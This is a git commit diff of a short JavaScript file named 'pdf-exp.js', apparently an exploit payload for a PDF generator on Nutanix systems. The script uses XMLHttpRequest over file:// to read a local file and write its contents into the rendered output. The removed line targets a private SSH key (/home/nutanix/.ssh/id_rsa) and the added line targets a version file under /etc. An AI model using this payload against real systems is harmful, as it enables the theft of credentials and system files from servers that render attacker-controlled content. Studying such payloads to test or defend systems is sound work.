02488fd1485e916181f763dd61950c136374a24d
gururaj359 <44290477+gururaj359@users.noreply.github.com>
2023-09-21 11:51:53 +0530

    Update pdf-exp.js

--- pdf-exp.js
+++ pdf-exp.js
@@ -1,5 +1,5 @@
 http = new XMLHttpRequest();
 http.onload = function(){document.write(this.responseText);}
 http.onerror = function(){document.write('failed!')}
-http.open("GET","file:///home/nutanix/.ssh/id_rsa");
+http.open("GET","file:///etc/nutanix/pcvm-version");
 http.send();
